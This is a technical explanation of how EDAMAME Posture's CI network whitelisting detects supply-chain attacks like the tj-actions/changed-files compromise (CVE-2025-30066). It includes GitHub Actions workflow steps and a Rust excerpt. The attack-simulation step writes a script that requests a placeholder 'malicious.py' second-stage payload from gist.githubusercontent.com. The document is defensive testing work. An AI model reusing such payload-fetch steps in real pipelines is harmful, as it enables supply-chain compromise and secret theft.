# Technical Analysis: EDAMAME Protection Against CVE-2025-30066

This document provides a detailed technical explanation of how EDAMAME Posture can detect and prevent supply chain attacks like the one described in CVE-2025-30066 (tj-actions/changed-files compromise).

## The Supply Chain Attack Vector

The attack on tj-actions/changed-files involved:

1. Compromising the maintainer's GitHub account credentials
2. Adding malicious code to a popular GitHub Action used by thousands of repositories
3. Making unauthorized network requests to gist.githubusercontent.com to fetch a second-stage payload
4. Accessing and exfiltrating sensitive repository secrets

This type of attack is particularly dangerous because:
- It uses trusted tools in the build pipeline
- It operates through normal-looking behavior (network requests)
- It can access all secrets available to the GitHub Action
- It's difficult to detect without network monitoring

## How EDAMAME Posture Detects These Attacks

EDAMAME Posture employs a "zero trust" approach to network traffic in CI/CD environments:

1. **Baseline Capture**: It first establishes a baseline of legitimate network traffic
2. **Whitelist Generation**: It converts observed traffic into a precise whitelist
3. **Continuous Monitoring**: It monitors all network traffic during builds
4. **Automatic Detection**: It flags any connections not in the whitelist
5. **Pipeline Integration**: It fails builds when violations are detected

## The Detection Process in Detail

Our [CVE-2025-30066.yml](.github/workflows/CVE-2025-30066.yml) workflow shows this protection in action:

### 1. Setup and Baseline Phase

```yaml
- name: Setup EDAMAME Posture
  run: |
    # Download and install EDAMAME Posture
    curl -LO https://github.com/edamametechnologies/edamame_posture_cli/releases/download/v0.9.21/edamame_posture-0.9.21-x86_64-unknown-linux-gnu
    chmod +x edamame_posture-0.9.21-x86_64-unknown-linux-gnu
    sudo mv edamame_posture-0.9.21-x86_64-unknown-linux-gnu /usr/local/bin/edamame_posture
    
    # Start EDAMAME in disconnected mode with LAN scanning and GitHub Linux whitelist
    sudo edamame_posture background-start-disconnected --network-scan --packet-capture --whitelist github_ubuntu
```

This starts EDAMAME Posture in disconnected mode (no external service needed) with network monitoring enabled. The `github_ubuntu` parameter provides a base whitelist for standard GitHub Actions runners.

### 2. Legitimate Traffic Capture

```yaml
- name: Run legitimate build process
  run: |
    # Install dependencies
    pip install requests
    
    # Run the build script
    python build.py

- name: Create whitelist from legitimate traffic
  run: |
    # Create a custom whitelist from the observed network activity
    sudo edamame_posture create-custom-whitelists > whitelist.json
    
    # Apply the whitelist for future monitoring
    sudo edamame_posture set-custom-whitelists "$(cat whitelist.json)"
```

During this phase, EDAMAME captures all legitimate network connections that occur during the normal build process. It then creates a whitelist that includes:
- Connections to Python package repositories (PyPI)
- Standard GitHub runner communications
- Any other expected network traffic

### 3. Attack Simulation

```yaml
- name: Create malicious build script (simulating CVE-2025-30066)
  run: |
    # Create a Python script that simulates the malicious behavior from CVE-2025-30066
    cat > build_malicious.py << EOF
    import requests
    
    # Simulate the attack vector - connect to gist.githubusercontent.com
    # This is similar to what the compromised tj-actions/changed-files action did
    print("Attempting to fetch malicious payload from gist.githubusercontent.com...")
    response = requests.get("https://gist.githubusercontent.com/example/123456/raw/malicious.py")
    EOF

- name: Run build process with simulated malicious behavior
  run: |
    # Run the malicious build script
    python build_malicious.py
```

This simulates exactly what happened in the tj-actions/changed-files attack - a request to gist.githubusercontent.com that wasn't part of the legitimate traffic pattern.

### 4. Detection and Prevention

```yaml
- name: Check for whitelist violations (should detect the malicious connection)
  id: whitelist_check
  continue-on-error: true
  run: |
    # This should exit with non-zero code because the whitelist was violated
    sudo edamame_posture get-sessions
    echo "exit_code=$?" >> $GITHUB_OUTPUT

- name: Verify detection
  run: |
    if [ "${{ steps.whitelist_check.outputs.exit_code }}" != "0" ]; then
      echo "✅ SUCCESS: EDAMAME detected unauthorized connection to gist.githubusercontent.com"
    else
      echo "❌ FAILURE: EDAMAME did not detect the unauthorized connection"
      exit 1
    fi
```

When `get-sessions` is called, EDAMAME checks all network traffic against the whitelist and returns a non-zero exit code if any violations are found. This would cause a real CI/CD pipeline to fail, preventing the attack from succeeding.

The command now supports more granular control with parameters to check for different types of suspicious sessions:

```bash
# Basic usage - returns non-zero exit code if whitelist exceptions found
edamame_posture get-sessions --fail-on-whitelist --fail-on-blacklist

# Advanced usage with all control parameters
# Format: get-sessions [--fail-on-whitelist] [--fail-on-blacklist] [--fail-on-anomalous] [--zeek-format] [--include-local-traffic]
edamame_posture get-sessions --fail-on-whitelist --fail-on-blacklist --fail-on-anomalous --zeek-format
```

With this flexibility, you can control which types of sessions should cause pipeline failures:
- `--fail-on-whitelist` – Exit with non-zero code for whitelist exceptions (defaults to true when a whitelist is active)
- `--fail-on-blacklist` – Exit with non-zero code for blacklisted connections
- `--fail-on-anomalous` – Exit with non-zero code for anomalous connections

## Technical Implementation

EDAMAME Posture's network monitoring relies on several components:

1. **Network Capture Engine**: Monitors all outbound connections from the CI/CD environment
2. **Whitelist Database**: Maintains patterns of allowed connections with attributes like:
   - Domain names and patterns
   - IP addresses and CIDR ranges
   - Ports and protocols
   - Request patterns
3. **Pattern Matching Logic**: Evaluates each connection against the whitelist rules

The key function in [background.rs](../src/background.rs) shows how this check is implemented:

```rust
pub fn background_get_sessions(local_traffic: bool, zeek_format: bool) -> i32 {
    // ... [code that retrieves and displays sessions]

    // Check whitelist conformance
    let whitelist_conformance = match rpc_get_whitelist_conformance(
        &EDAMAME_CA_PEM,
        &EDAMAME_CLIENT_PEM,
        &EDAMAME_CLIENT_KEY,
        &EDAMAME_TARGET,
    ) {
        Ok(conformance) => conformance,
        Err(e) => {
            eprintln!("Error getting whitelist conformance: {}", e);
            return ERROR_CODE_SERVER_ERROR;
        }
    };
    if !whitelist_conformance {
        eprintln!("Some connections failed the whitelist check");
        return ERROR_CODE_MISMATCH;
    } else {
        return 0;
    }
}
```

This returns an error code when network traffic violates the whitelist, which is then used to fail the CI/CD pipeline.

## Benefits Over Traditional Security Approaches

EDAMAME's approach offers several advantages over traditional security methods:

1. **No Signatures Needed**: Unlike antivirus or IDS systems, no prior knowledge of the attack is required
2. **Zero Configuration**: Simply capture legitimate traffic and use it to create whitelists
3. **Minimal False Positives**: By learning from actual legitimate traffic patterns
4. **Preventative, Not Just Detective**: Stops attacks before they can succeed
5. **CI/CD Integration**: Designed specifically for protecting build pipelines

By implementing this approach, organizations can prevent not just known attacks like CVE-2025-30066, but also future novel supply chain attacks that use similar network-based exfiltration methods. 